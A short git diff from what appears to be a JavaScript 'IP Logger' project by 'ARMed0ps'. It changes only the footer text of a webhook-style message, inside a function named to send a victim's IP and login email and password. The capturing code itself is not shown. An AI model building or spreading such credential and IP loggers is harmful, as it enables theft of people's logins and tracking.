@@ -66,7 +66,7 @@ const sendIPnlogin = (email = 'unknown', password = 'unknown') => {
                                         url: "https://armed0ps.github.io/IP-Logger/hackerpfp.jpg"
                                     },
                                     footer: {
-                                        text: "IP Logger v2 by ARMed0ps",
+                                        text: "IP Logger by ARMed0ps",
                                         icon_url: "https://armed0ps.github.io/IP-Logger/hackerpfp.jpg"
                                     },
                                     timestamp: new Date().toISOString()
